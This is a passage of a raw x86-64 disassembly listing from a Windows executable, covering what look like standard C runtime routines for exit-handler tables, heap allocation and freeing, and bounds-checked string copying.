   14000410d:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140004112:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140004117:	57                   	push   %rdi
   140004118:	41 54                	push   %r12
   14000411a:	41 55                	push   %r13
   14000411c:	41 56                	push   %r14
   14000411e:	41 57                	push   %r15
   140004120:	48 83 ec 40          	sub    $0x40,%rsp
   140004124:	49 8b f9             	mov    %r9,%rdi
   140004127:	4d 8b f8             	mov    %r8,%r15
   14000412a:	8b 0a                	mov    (%rdx),%ecx
   14000412c:	e8 4b 23 00 00       	call   0x14000647c
   140004131:	90                   	nop
   140004132:	49 8b 07             	mov    (%r15),%rax
   140004135:	48 8b 10             	mov    (%rax),%rdx
   140004138:	48 85 d2             	test   %rdx,%rdx
   14000413b:	75 09                	jne    0x140004146
   14000413d:	48 83 cb ff          	or     $0xffffffffffffffff,%rbx
   140004141:	e9 40 01 00 00       	jmp    0x140004286
   140004146:	48 8b 35 cb 0e 01 00 	mov    0x10ecb(%rip),%rsi        # 0x140015018
   14000414d:	44 8b c6             	mov    %esi,%r8d
   140004150:	41 83 e0 3f          	and    $0x3f,%r8d
   140004154:	48 8b fe             	mov    %rsi,%rdi
   140004157:	48 33 3a             	xor    (%rdx),%rdi
   14000415a:	41 8b c8             	mov    %r8d,%ecx
   14000415d:	48 d3 cf             	ror    %cl,%rdi
   140004160:	48 89 7c 24 30       	mov    %rdi,0x30(%rsp)
   140004165:	48 8b de             	mov    %rsi,%rbx
   140004168:	48 33 5a 08          	xor    0x8(%rdx),%rbx
   14000416c:	48 d3 cb             	ror    %cl,%rbx
   14000416f:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140004174:	48 8d 47 ff          	lea    -0x1(%rdi),%rax
   140004178:	48 83 f8 fd          	cmp    $0xfffffffffffffffd,%rax
   14000417c:	0f 87 fa 00 00 00    	ja     0x14000427c
   140004182:	4c 8b e7             	mov    %rdi,%r12
   140004185:	48 89 7c 24 28       	mov    %rdi,0x28(%rsp)
   14000418a:	4c 8b f3             	mov    %rbx,%r14
   14000418d:	48 89 5c 24 38       	mov    %rbx,0x38(%rsp)
   140004192:	41 bd 40 00 00 00    	mov    $0x40,%r13d
   140004198:	41 8b cd             	mov    %r13d,%ecx
   14000419b:	41 2b c8             	sub    %r8d,%ecx
   14000419e:	33 c0                	xor    %eax,%eax
   1400041a0:	48 d3 c8             	ror    %cl,%rax
   1400041a3:	48 33 c6             	xor    %rsi,%rax
   1400041a6:	48 83 eb 08          	sub    $0x8,%rbx
   1400041aa:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   1400041af:	48 3b df             	cmp    %rdi,%rbx
   1400041b2:	72 0c                	jb     0x1400041c0
   1400041b4:	48 39 03             	cmp    %rax,(%rbx)
   1400041b7:	75 02                	jne    0x1400041bb
   1400041b9:	eb eb                	jmp    0x1400041a6
   1400041bb:	48 3b df             	cmp    %rdi,%rbx
   1400041be:	73 4a                	jae    0x14000420a
   1400041c0:	48 83 cb ff          	or     $0xffffffffffffffff,%rbx
   1400041c4:	48 3b fb             	cmp    %rbx,%rdi
   1400041c7:	74 0f                	je     0x1400041d8
   1400041c9:	48 8b cf             	mov    %rdi,%rcx
   1400041cc:	e8 6f 05 00 00       	call   0x140004740
   1400041d1:	48 8b 35 40 0e 01 00 	mov    0x10e40(%rip),%rsi        # 0x140015018
   1400041d8:	8b c6                	mov    %esi,%eax
   1400041da:	83 e0 3f             	and    $0x3f,%eax
   1400041dd:	44 2b e8             	sub    %eax,%r13d
   1400041e0:	41 8b cd             	mov    %r13d,%ecx
   1400041e3:	33 d2                	xor    %edx,%edx
   1400041e5:	48 d3 ca             	ror    %cl,%rdx
   1400041e8:	48 33 d6             	xor    %rsi,%rdx
   1400041eb:	49 8b 07             	mov    (%r15),%rax
   1400041ee:	48 8b 08             	mov    (%rax),%rcx
   1400041f1:	48 89 11             	mov    %rdx,(%rcx)
   1400041f4:	49 8b 07             	mov    (%r15),%rax
   1400041f7:	48 8b 08             	mov    (%rax),%rcx
   1400041fa:	48 89 51 08          	mov    %rdx,0x8(%rcx)
   1400041fe:	49 8b 07             	mov    (%r15),%rax
   140004201:	48 8b 08             	mov    (%rax),%rcx
   140004204:	48 89 51 10          	mov    %rdx,0x10(%rcx)
   140004208:	eb 72                	jmp    0x14000427c
   14000420a:	8b ce                	mov    %esi,%ecx
   14000420c:	83 e1 3f             	and    $0x3f,%ecx
   14000420f:	48 33 33             	xor    (%rbx),%rsi
   140004212:	48 d3 ce             	ror    %cl,%rsi
   140004215:	48 89 03             	mov    %rax,(%rbx)
   140004218:	48 8b ce             	mov    %rsi,%rcx
   14000421b:	ff 15 67 80 00 00    	call   *0x8067(%rip)        # 0x14000c288
   140004221:	ff d6                	call   *%rsi
   140004223:	49 8b 07             	mov    (%r15),%rax
   140004226:	48 8b 10             	mov    (%rax),%rdx
   140004229:	48 8b 35 e8 0d 01 00 	mov    0x10de8(%rip),%rsi        # 0x140015018
   140004230:	44 8b c6             	mov    %esi,%r8d
   140004233:	41 83 e0 3f          	and    $0x3f,%r8d
   140004237:	4c 8b ce             	mov    %rsi,%r9
   14000423a:	4c 33 0a             	xor    (%rdx),%r9
   14000423d:	41 8b c8             	mov    %r8d,%ecx
   140004240:	49 d3 c9             	ror    %cl,%r9
   140004243:	48 8b 42 08          	mov    0x8(%rdx),%rax
   140004247:	48 33 c6             	xor    %rsi,%rax
   14000424a:	48 d3 c8             	ror    %cl,%rax
   14000424d:	4d 3b cc             	cmp    %r12,%r9
   140004250:	75 05                	jne    0x140004257
   140004252:	49 3b c6             	cmp    %r14,%rax
   140004255:	74 20                	je     0x140004277
   140004257:	4d 8b e1             	mov    %r9,%r12
   14000425a:	4c 89 4c 24 28       	mov    %r9,0x28(%rsp)
   14000425f:	49 8b f9             	mov    %r9,%rdi
   140004262:	4c 89 4c 24 30       	mov    %r9,0x30(%rsp)
   140004267:	4c 8b f0             	mov    %rax,%r14
   14000426a:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   14000426f:	48 8b d8             	mov    %rax,%rbx
   140004272:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140004277:	e9 1c ff ff ff       	jmp    0x140004198
   14000427c:	48 8b bc 24 88 00 00 	mov    0x88(%rsp),%rdi
   140004283:	00 
   140004284:	33 db                	xor    %ebx,%ebx
   140004286:	8b 0f                	mov    (%rdi),%ecx
   140004288:	e8 43 22 00 00       	call   0x1400064d0
   14000428d:	8b c3                	mov    %ebx,%eax
   14000428f:	48 8b 5c 24 70       	mov    0x70(%rsp),%rbx
   140004294:	48 8b 74 24 78       	mov    0x78(%rsp),%rsi
   140004299:	48 83 c4 40          	add    $0x40,%rsp
   14000429d:	41 5f                	pop    %r15
   14000429f:	41 5e                	pop    %r14
   1400042a1:	41 5d                	pop    %r13
   1400042a3:	41 5c                	pop    %r12
   1400042a5:	5f                   	pop    %rdi
   1400042a6:	c3                   	ret
   1400042a7:	90                   	nop
   1400042a8:	48 8b c4             	mov    %rsp,%rax
   1400042ab:	48 89 58 08          	mov    %rbx,0x8(%rax)
   1400042af:	48 89 68 10          	mov    %rbp,0x10(%rax)
   1400042b3:	48 89 70 18          	mov    %rsi,0x18(%rax)
   1400042b7:	48 89 78 20          	mov    %rdi,0x20(%rax)
   1400042bb:	41 54                	push   %r12
   1400042bd:	41 56                	push   %r14
   1400042bf:	41 57                	push   %r15
   1400042c1:	48 83 ec 20          	sub    $0x20,%rsp
   1400042c5:	48 8b 01             	mov    (%rcx),%rax
   1400042c8:	33 f6                	xor    %esi,%esi
   1400042ca:	4c 8b f9             	mov    %rcx,%r15
   1400042cd:	48 8b 18             	mov    (%rax),%rbx
   1400042d0:	48 85 db             	test   %rbx,%rbx
   1400042d3:	75 08                	jne    0x1400042dd
   1400042d5:	83 c8 ff             	or     $0xffffffff,%eax
   1400042d8:	e9 86 01 00 00       	jmp    0x140004463
   1400042dd:	4c 8b 05 34 0d 01 00 	mov    0x10d34(%rip),%r8        # 0x140015018
   1400042e4:	41 bc 40 00 00 00    	mov    $0x40,%r12d
   1400042ea:	48 8b 2b             	mov    (%rbx),%rbp
   1400042ed:	41 8b c8             	mov    %r8d,%ecx
   1400042f0:	4c 8b 4b 08          	mov    0x8(%rbx),%r9
   1400042f4:	83 e1 3f             	and    $0x3f,%ecx
   1400042f7:	48 8b 5b 10          	mov    0x10(%rbx),%rbx
   1400042fb:	49 33 e8             	xor    %r8,%rbp
   1400042fe:	4d 33 c8             	xor    %r8,%r9
   140004301:	48 d3 cd             	ror    %cl,%rbp
   140004304:	49 33 d8             	xor    %r8,%rbx
   140004307:	49 d3 c9             	ror    %cl,%r9
   14000430a:	48 d3 cb             	ror    %cl,%rbx
   14000430d:	4c 3b cb             	cmp    %rbx,%r9
   140004310:	0f 85 c7 00 00 00    	jne    0x1400043dd
   140004316:	48 2b dd             	sub    %rbp,%rbx
   140004319:	b8 00 02 00 00       	mov    $0x200,%eax
   14000431e:	48 c1 fb 03          	sar    $0x3,%rbx
   140004322:	48 3b d8             	cmp    %rax,%rbx
   140004325:	48 8b fb             	mov    %rbx,%rdi
   140004328:	48 0f 47 f8          	cmova  %rax,%rdi
   14000432c:	41 8d 44 24 e0       	lea    -0x20(%r12),%eax
   140004331:	48 03 fb             	add    %rbx,%rdi
   140004334:	48 0f 44 f8          	cmove  %rax,%rdi
   140004338:	48 3b fb             	cmp    %rbx,%rdi
   14000433b:	72 1f                	jb     0x14000435c
   14000433d:	45 8d 44 24 c8       	lea    -0x38(%r12),%r8d
   140004342:	48 8b d7             	mov    %rdi,%rdx
   140004345:	48 8b cd             	mov    %rbp,%rcx
   140004348:	e8 db 35 00 00       	call   0x140007928
   14000434d:	33 c9                	xor    %ecx,%ecx
   14000434f:	4c 8b f0             	mov    %rax,%r14
   140004352:	e8 e9 03 00 00       	call   0x140004740
   140004357:	4d 85 f6             	test   %r14,%r14
   14000435a:	75 28                	jne    0x140004384
   14000435c:	48 8d 7b 04          	lea    0x4(%rbx),%rdi
   140004360:	41 b8 08 00 00 00    	mov    $0x8,%r8d
   140004366:	48 8b d7             	mov    %rdi,%rdx
   140004369:	48 8b cd             	mov    %rbp,%rcx
   14000436c:	e8 b7 35 00 00       	call   0x140007928
   140004371:	33 c9                	xor    %ecx,%ecx
   140004373:	4c 8b f0             	mov    %rax,%r14
   140004376:	e8 c5 03 00 00       	call   0x140004740
   14000437b:	4d 85 f6             	test   %r14,%r14
   14000437e:	0f 84 51 ff ff ff    	je     0x1400042d5
   140004384:	4c 8b 05 8d 0c 01 00 	mov    0x10c8d(%rip),%r8        # 0x140015018
   14000438b:	4d 8d 0c de          	lea    (%r14,%rbx,8),%r9
   14000438f:	41 8b c0             	mov    %r8d,%eax
   140004392:	49 8d 1c fe          	lea    (%r14,%rdi,8),%rbx
   140004396:	83 e0 3f             	and    $0x3f,%eax
   140004399:	41 8b cc             	mov    %r12d,%ecx
   14000439c:	2b c8                	sub    %eax,%ecx
   14000439e:	48 8b d6             	mov    %rsi,%rdx
   1400043a1:	48 d3 ca             	ror    %cl,%rdx
   1400043a4:	48 8b c3             	mov    %rbx,%rax
   1400043a7:	49 2b c1             	sub    %r9,%rax
   1400043aa:	49 33 d0             	xor    %r8,%rdx
   1400043ad:	48 83 c0 07          	add    $0x7,%rax
   1400043b1:	49 8b ee             	mov    %r14,%rbp
   1400043b4:	48 c1 e8 03          	shr    $0x3,%rax
   1400043b8:	49 8b c9             	mov    %r9,%rcx
   1400043bb:	4c 3b cb             	cmp    %rbx,%r9
   1400043be:	48 0f 47 c6          	cmova  %rsi,%rax
   1400043c2:	48 85 c0             	test   %rax,%rax
   1400043c5:	74 16                	je     0x1400043dd
   1400043c7:	48 ff c6             	inc    %rsi
   1400043ca:	48 89 11             	mov    %rdx,(%rcx)
   1400043cd:	48 8d 49 08          	lea    0x8(%rcx),%rcx
   1400043d1:	48 3b f0             	cmp    %rax,%rsi
   1400043d4:	75 f1                	jne    0x1400043c7
   1400043d6:	4c 8b 05 3b 0c 01 00 	mov    0x10c3b(%rip),%r8        # 0x140015018
   1400043dd:	41 8b c0             	mov    %r8d,%eax
   1400043e0:	41 8b cc             	mov    %r12d,%ecx
   1400043e3:	83 e0 3f             	and    $0x3f,%eax
   1400043e6:	2b c8                	sub    %eax,%ecx
   1400043e8:	49 8b 47 08          	mov    0x8(%r15),%rax
   1400043ec:	48 8b 10             	mov    (%rax),%rdx
   1400043ef:	41 8b c4             	mov    %r12d,%eax
   1400043f2:	48 d3 ca             	ror    %cl,%rdx
   1400043f5:	49 33 d0             	xor    %r8,%rdx
   1400043f8:	4d 8d 41 08          	lea    0x8(%r9),%r8
   1400043fc:	49 89 11             	mov    %rdx,(%r9)
   1400043ff:	48 8b 15 12 0c 01 00 	mov    0x10c12(%rip),%rdx        # 0x140015018
   140004406:	8b ca                	mov    %edx,%ecx
   140004408:	83 e1 3f             	and    $0x3f,%ecx
   14000440b:	2b c1                	sub    %ecx,%eax
   14000440d:	8a c8                	mov    %al,%cl
   14000440f:	49 8b 07             	mov    (%r15),%rax
   140004412:	48 d3 cd             	ror    %cl,%rbp
   140004415:	48 33 ea             	xor    %rdx,%rbp
   140004418:	48 8b 08             	mov    (%rax),%rcx
   14000441b:	48 89 29             	mov    %rbp,(%rcx)
   14000441e:	41 8b cc             	mov    %r12d,%ecx
   140004421:	48 8b 15 f0 0b 01 00 	mov    0x10bf0(%rip),%rdx        # 0x140015018
   140004428:	8b c2                	mov    %edx,%eax
   14000442a:	83 e0 3f             	and    $0x3f,%eax
   14000442d:	2b c8                	sub    %eax,%ecx
   14000442f:	49 8b 07             	mov    (%r15),%rax
   140004432:	49 d3 c8             	ror    %cl,%r8
   140004435:	4c 33 c2             	xor    %rdx,%r8
   140004438:	48 8b 10             	mov    (%rax),%rdx
   14000443b:	4c 89 42 08          	mov    %r8,0x8(%rdx)
   14000443f:	48 8b 15 d2 0b 01 00 	mov    0x10bd2(%rip),%rdx        # 0x140015018
   140004446:	8b c2                	mov    %edx,%eax
   140004448:	83 e0 3f             	and    $0x3f,%eax
   14000444b:	44 2b e0             	sub    %eax,%r12d
   14000444e:	49 8b 07             	mov    (%r15),%rax
   140004451:	41 8a cc             	mov    %r12b,%cl
   140004454:	48 d3 cb             	ror    %cl,%rbx
   140004457:	48 33 da             	xor    %rdx,%rbx
   14000445a:	48 8b 08             	mov    (%rax),%rcx
   14000445d:	33 c0                	xor    %eax,%eax
   14000445f:	48 89 59 10          	mov    %rbx,0x10(%rcx)
   140004463:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140004468:	48 8b 6c 24 48       	mov    0x48(%rsp),%rbp
   14000446d:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   140004472:	48 8b 7c 24 58       	mov    0x58(%rsp),%rdi
   140004477:	48 83 c4 20          	add    $0x20,%rsp
   14000447b:	41 5f                	pop    %r15
   14000447d:	41 5e                	pop    %r14
   14000447f:	41 5c                	pop    %r12
   140004481:	c3                   	ret
   140004482:	90                   	nop
   140004483:	90                   	nop
   140004484:	48 8b d1             	mov    %rcx,%rdx
   140004487:	48 8d 0d 2a 1d 01 00 	lea    0x11d2a(%rip),%rcx        # 0x1400161b8
   14000448e:	e9 7d 00 00 00       	jmp    0x140004510
   140004493:	90                   	nop
   140004494:	4c 8b dc             	mov    %rsp,%r11
   140004497:	49 89 4b 08          	mov    %rcx,0x8(%r11)
   14000449b:	48 83 ec 38          	sub    $0x38,%rsp
   14000449f:	49 8d 43 08          	lea    0x8(%r11),%rax
   1400044a3:	49 89 43 e8          	mov    %rax,-0x18(%r11)
   1400044a7:	4d 8d 4b 18          	lea    0x18(%r11),%r9
   1400044ab:	b8 02 00 00 00       	mov    $0x2,%eax
   1400044b0:	4d 8d 43 e8          	lea    -0x18(%r11),%r8
   1400044b4:	49 8d 53 20          	lea    0x20(%r11),%rdx
   1400044b8:	89 44 24 50          	mov    %eax,0x50(%rsp)
   1400044bc:	49 8d 4b 10          	lea    0x10(%r11),%rcx
   1400044c0:	89 44 24 58          	mov    %eax,0x58(%rsp)
   1400044c4:	e8 3f fc ff ff       	call   0x140004108
   1400044c9:	48 83 c4 38          	add    $0x38,%rsp
   1400044cd:	c3                   	ret
   1400044ce:	90                   	nop
   1400044cf:	90                   	nop
   1400044d0:	45 33 c9             	xor    %r9d,%r9d
   1400044d3:	4c 8b c1             	mov    %rcx,%r8
   1400044d6:	48 85 c9             	test   %rcx,%rcx
   1400044d9:	75 04                	jne    0x1400044df
   1400044db:	83 c8 ff             	or     $0xffffffff,%eax
   1400044de:	c3                   	ret
   1400044df:	48 8b 41 10          	mov    0x10(%rcx),%rax
   1400044e3:	48 39 01             	cmp    %rax,(%rcx)
   1400044e6:	75 24                	jne    0x14000450c
   1400044e8:	48 8b 15 29 0b 01 00 	mov    0x10b29(%rip),%rdx        # 0x140015018
   1400044ef:	b9 40 00 00 00       	mov    $0x40,%ecx
   1400044f4:	8b c2                	mov    %edx,%eax
   1400044f6:	83 e0 3f             	and    $0x3f,%eax
   1400044f9:	2b c8                	sub    %eax,%ecx
   1400044fb:	49 d3 c9             	ror    %cl,%r9
   1400044fe:	4c 33 ca             	xor    %rdx,%r9
   140004501:	4d 89 08             	mov    %r9,(%r8)
   140004504:	4d 89 48 08          	mov    %r9,0x8(%r8)
   140004508:	4d 89 48 10          	mov    %r9,0x10(%r8)
   14000450c:	33 c0                	xor    %eax,%eax
   14000450e:	c3                   	ret
   14000450f:	90                   	nop
   140004510:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   140004515:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   14000451a:	55                   	push   %rbp
   14000451b:	48 8b ec             	mov    %rsp,%rbp
   14000451e:	48 83 ec 40          	sub    $0x40,%rsp
   140004522:	48 8d 45 10          	lea    0x10(%rbp),%rax
   140004526:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
   14000452a:	4c 8d 4d 28          	lea    0x28(%rbp),%r9
   14000452e:	48 8d 45 18          	lea    0x18(%rbp),%rax
   140004532:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   140004536:	4c 8d 45 e8          	lea    -0x18(%rbp),%r8
   14000453a:	b8 02 00 00 00       	mov    $0x2,%eax
   14000453f:	48 8d 55 e0          	lea    -0x20(%rbp),%rdx
   140004543:	48 8d 4d 20          	lea    0x20(%rbp),%rcx
   140004547:	89 45 28             	mov    %eax,0x28(%rbp)
   14000454a:	89 45 e0             	mov    %eax,-0x20(%rbp)
   14000454d:	e8 7a fb ff ff       	call   0x1400040cc
   140004552:	48 83 c4 40          	add    $0x40,%rsp
   140004556:	5d                   	pop    %rbp
   140004557:	c3                   	ret
   140004558:	48 8d 05 91 10 01 00 	lea    0x11091(%rip),%rax        # 0x1400155f0
   14000455f:	48 89 05 b2 24 01 00 	mov    %rax,0x124b2(%rip)        # 0x140016a18
   140004566:	b0 01                	mov    $0x1,%al
   140004568:	c3                   	ret
   140004569:	90                   	nop
   14000456a:	90                   	nop
   14000456b:	90                   	nop
   14000456c:	48 83 ec 28          	sub    $0x28,%rsp
   140004570:	48 8d 0d 41 1c 01 00 	lea    0x11c41(%rip),%rcx        # 0x1400161b8
   140004577:	e8 54 ff ff ff       	call   0x1400044d0
   14000457c:	48 8d 0d 4d 1c 01 00 	lea    0x11c4d(%rip),%rcx        # 0x1400161d0
   140004583:	e8 48 ff ff ff       	call   0x1400044d0
   140004588:	b0 01                	mov    $0x1,%al
   14000458a:	48 83 c4 28          	add    $0x28,%rsp
   14000458e:	c3                   	ret
   14000458f:	90                   	nop
   140004590:	b0 01                	mov    $0x1,%al
   140004592:	c3                   	ret
   140004593:	90                   	nop
   140004594:	48 83 ec 28          	sub    $0x28,%rsp
   140004598:	e8 cb f5 ff ff       	call   0x140003b68
   14000459d:	b0 01                	mov    $0x1,%al
   14000459f:	48 83 c4 28          	add    $0x28,%rsp
   1400045a3:	c3                   	ret
   1400045a4:	53                   	push   %rbx
   1400045a5:	48 83 ec 20          	sub    $0x20,%rsp
   1400045a9:	48 8b 15 68 0a 01 00 	mov    0x10a68(%rip),%rdx        # 0x140015018
   1400045b0:	b9 40 00 00 00       	mov    $0x40,%ecx
   1400045b5:	8b c2                	mov    %edx,%eax
   1400045b7:	33 db                	xor    %ebx,%ebx
   1400045b9:	83 e0 3f             	and    $0x3f,%eax
   1400045bc:	2b c8                	sub    %eax,%ecx
   1400045be:	48 d3 cb             	ror    %cl,%rbx
   1400045c1:	48 33 da             	xor    %rdx,%rbx
   1400045c4:	48 8b cb             	mov    %rbx,%rcx
   1400045c7:	e8 54 05 00 00       	call   0x140004b20
   1400045cc:	48 8b cb             	mov    %rbx,%rcx
   1400045cf:	e8 d8 34 00 00       	call   0x140007aac
   1400045d4:	48 8b cb             	mov    %rbx,%rcx
   1400045d7:	e8 c4 35 00 00       	call   0x140007ba0
   1400045dc:	48 8b cb             	mov    %rbx,%rcx
   1400045df:	e8 90 ef ff ff       	call   0x140003574
   1400045e4:	48 8b cb             	mov    %rbx,%rcx
   1400045e7:	e8 20 f9 ff ff       	call   0x140003f0c
   1400045ec:	b0 01                	mov    $0x1,%al
   1400045ee:	48 83 c4 20          	add    $0x20,%rsp
   1400045f2:	5b                   	pop    %rbx
   1400045f3:	c3                   	ret
   1400045f4:	33 c9                	xor    %ecx,%ecx
   1400045f6:	e9 e5 e5 ff ff       	jmp    0x140002be0
   1400045fb:	90                   	nop
   1400045fc:	90                   	nop
   1400045fd:	90                   	nop
   1400045fe:	90                   	nop
   1400045ff:	90                   	nop
   140004600:	53                   	push   %rbx
   140004601:	48 83 ec 20          	sub    $0x20,%rsp
   140004605:	48 8b 0d cc 0c 01 00 	mov    0x10ccc(%rip),%rcx        # 0x1400152d8
   14000460c:	83 c8 ff             	or     $0xffffffff,%eax
   14000460f:	f0 0f c1 01          	lock xadd %eax,(%rcx)
   140004613:	83 f8 01             	cmp    $0x1,%eax
   140004616:	75 1f                	jne    0x140004637
   140004618:	48 8b 0d b9 0c 01 00 	mov    0x10cb9(%rip),%rcx        # 0x1400152d8
   14000461f:	48 8d 1d 8a 0a 01 00 	lea    0x10a8a(%rip),%rbx        # 0x1400150b0
   140004626:	48 3b cb             	cmp    %rbx,%rcx
   140004629:	74 0c                	je     0x140004637
   14000462b:	e8 10 01 00 00       	call   0x140004740
   140004630:	48 89 1d a1 0c 01 00 	mov    %rbx,0x10ca1(%rip)        # 0x1400152d8
   140004637:	48 8b 0d 12 24 01 00 	mov    0x12412(%rip),%rcx        # 0x140016a50
   14000463e:	e8 fd 00 00 00       	call   0x140004740
   140004643:	48 8b 0d 0e 24 01 00 	mov    0x1240e(%rip),%rcx        # 0x140016a58
   14000464a:	33 db                	xor    %ebx,%ebx
   14000464c:	48 89 1d fd 23 01 00 	mov    %rbx,0x123fd(%rip)        # 0x140016a50
   140004653:	e8 e8 00 00 00       	call   0x140004740
   140004658:	48 8b 0d c1 1b 01 00 	mov    0x11bc1(%rip),%rcx        # 0x140016220
   14000465f:	48 89 1d f2 23 01 00 	mov    %rbx,0x123f2(%rip)        # 0x140016a58
   140004666:	e8 d5 00 00 00       	call   0x140004740
   14000466b:	48 8b 0d b6 1b 01 00 	mov    0x11bb6(%rip),%rcx        # 0x140016228
   140004672:	48 89 1d a7 1b 01 00 	mov    %rbx,0x11ba7(%rip)        # 0x140016220
   140004679:	e8 c2 00 00 00       	call   0x140004740
   14000467e:	b0 01                	mov    $0x1,%al
   140004680:	48 89 1d a1 1b 01 00 	mov    %rbx,0x11ba1(%rip)        # 0x140016228
   140004687:	48 83 c4 20          	add    $0x20,%rsp
   14000468b:	5b                   	pop    %rbx
   14000468c:	c3                   	ret
   14000468d:	90                   	nop
   14000468e:	90                   	nop
   14000468f:	90                   	nop
   140004690:	48 8d 15 e9 80 00 00 	lea    0x80e9(%rip),%rdx        # 0x14000c780
   140004697:	48 8d 0d f2 7f 00 00 	lea    0x7ff2(%rip),%rcx        # 0x14000c690
   14000469e:	e9 25 33 00 00       	jmp    0x1400079c8
   1400046a3:	90                   	nop
   1400046a4:	48 8d 15 d5 80 00 00 	lea    0x80d5(%rip),%rdx        # 0x14000c780
   1400046ab:	48 8d 0d de 7f 00 00 	lea    0x7fde(%rip),%rcx        # 0x14000c690
   1400046b2:	e9 a5 33 00 00       	jmp    0x140007a5c
   1400046b7:	90                   	nop
   1400046b8:	53                   	push   %rbx
   1400046b9:	48 83 ec 20          	sub    $0x20,%rsp
   1400046bd:	e8 ee 09 00 00       	call   0x1400050b0
   1400046c2:	48 8b 58 18          	mov    0x18(%rax),%rbx
   1400046c6:	48 85 db             	test   %rbx,%rbx
   1400046c9:	74 0d                	je     0x1400046d8
   1400046cb:	48 8b cb             	mov    %rbx,%rcx
   1400046ce:	ff 15 b4 7b 00 00    	call   *0x7bb4(%rip)        # 0x14000c288
   1400046d4:	ff d3                	call   *%rbx
   1400046d6:	eb 00                	jmp    0x1400046d8
   1400046d8:	e8 03 01 00 00       	call   0x1400047e0
   1400046dd:	90                   	nop
   1400046de:	90                   	nop
   1400046df:	90                   	nop
   1400046e0:	53                   	push   %rbx
   1400046e1:	48 83 ec 20          	sub    $0x20,%rsp
   1400046e5:	33 db                	xor    %ebx,%ebx
   1400046e7:	48 85 c9             	test   %rcx,%rcx
   1400046ea:	74 0c                	je     0x1400046f8
   1400046ec:	48 85 d2             	test   %rdx,%rdx
   1400046ef:	74 07                	je     0x1400046f8
   1400046f1:	4d 85 c0             	test   %r8,%r8
   1400046f4:	75 1b                	jne    0x140004711
   1400046f6:	88 19                	mov    %bl,(%rcx)
   1400046f8:	e8 f3 05 00 00       	call   0x140004cf0
   1400046fd:	bb 16 00 00 00       	mov    $0x16,%ebx
   140004702:	89 18                	mov    %ebx,(%rax)
   140004704:	e8 c7 04 00 00       	call   0x140004bd0
   140004709:	8b c3                	mov    %ebx,%eax
   14000470b:	48 83 c4 20          	add    $0x20,%rsp
   14000470f:	5b                   	pop    %rbx
   140004710:	c3                   	ret
   140004711:	4c 8b c9             	mov    %rcx,%r9
   140004714:	4c 2b c1             	sub    %rcx,%r8
   140004717:	43 8a 04 08          	mov    (%r8,%r9,1),%al
   14000471b:	41 88 01             	mov    %al,(%r9)
   14000471e:	49 ff c1             	inc    %r9
   140004721:	84 c0                	test   %al,%al
   140004723:	74 06                	je     0x14000472b
   140004725:	48 83 ea 01          	sub    $0x1,%rdx
   140004729:	75 ec                	jne    0x140004717
   14000472b:	48 85 d2             	test   %rdx,%rdx
   14000472e:	75 d9                	jne    0x140004709
   140004730:	88 19                	mov    %bl,(%rcx)
   140004732:	e8 b9 05 00 00       	call   0x140004cf0
   140004737:	bb 22 00 00 00       	mov    $0x22,%ebx
   14000473c:	eb c4                	jmp    0x140004702
   14000473e:	90                   	nop
   14000473f:	90                   	nop
   140004740:	48 85 c9             	test   %rcx,%rcx
   140004743:	74 37                	je     0x14000477c
   140004745:	53                   	push   %rbx
   140004746:	48 83 ec 20          	sub    $0x20,%rsp
   14000474a:	4c 8b c1             	mov    %rcx,%r8
   14000474d:	33 d2                	xor    %edx,%edx
   14000474f:	48 8b 0d 9a 1a 01 00 	mov    0x11a9a(%rip),%rcx        # 0x1400161f0
   140004756:	ff 15 3c 7a 00 00    	call   *0x7a3c(%rip)        # 0x14000c198
   14000475c:	85 c0                	test   %eax,%eax
   14000475e:	75 17                	jne    0x140004777
   140004760:	e8 8b 05 00 00       	call   0x140004cf0
   140004765:	48 8b d8             	mov    %rax,%rbx
   140004768:	ff 15 92 78 00 00    	call   *0x7892(%rip)        # 0x14000c000
   14000476e:	8b c8                	mov    %eax,%ecx
   140004770:	e8 c3 04 00 00       	call   0x140004c38
   140004775:	89 03                	mov    %eax,(%rbx)
   140004777:	48 83 c4 20          	add    $0x20,%rsp
   14000477b:	5b                   	pop    %rbx
   14000477c:	c3                   	ret
   14000477d:	90                   	nop
   14000477e:	90                   	nop
   14000477f:	90                   	nop
   140004780:	53                   	push   %rbx
   140004781:	48 83 ec 20          	sub    $0x20,%rsp
   140004785:	48 8b d9             	mov    %rcx,%rbx
   140004788:	48 83 f9 e0          	cmp    $0xffffffffffffffe0,%rcx
   14000478c:	77 3c                	ja     0x1400047ca
   14000478e:	48 85 c9             	test   %rcx,%rcx
   140004791:	b8 01 00 00 00       	mov    $0x1,%eax
   140004796:	48 0f 44 d8          	cmove  %rax,%rbx
   14000479a:	eb 15                	jmp    0x1400047b1
   14000479c:	e8 ef f8 ff ff       	call   0x140004090
   1400047a1:	85 c0                	test   %eax,%eax
   1400047a3:	74 25                	je     0x1400047ca
   1400047a5:	48 8b cb             	mov    %rbx,%rcx
   1400047a8:	e8 07 33 00 00       	call   0x140007ab4
   1400047ad:	85 c0                	test   %eax,%eax
   1400047af:	74 19                	je     0x1400047ca
   1400047b1:	48 8b 0d 38 1a 01 00 	mov    0x11a38(%rip),%rcx        # 0x1400161f0
   1400047b8:	4c 8b c3             	mov    %rbx,%r8
   1400047bb:	33 d2                	xor    %edx,%edx
   1400047bd:	ff 15 dd 79 00 00    	call   *0x79dd(%rip)        # 0x14000c1a0
   1400047c3:	48 85 c0             	test   %rax,%rax
   1400047c6:	74 d4                	je     0x14000479c
   1400047c8:	eb 0d                	jmp    0x1400047d7
   1400047ca:	e8 21 05 00 00       	call   0x140004cf0
   1400047cf:	c7 00 0c 00 00 00    	movl   $0xc,(%rax)
   1400047d5:	33 c0                	xor    %eax,%eax
   1400047d7:	48 83 c4 20          	add    $0x20,%rsp
   1400047db:	5b                   	pop    %rbx
   1400047dc:	c3                   	ret
   1400047dd:	90                   	nop
   1400047de:	90                   	nop
   1400047df:	90                   	nop
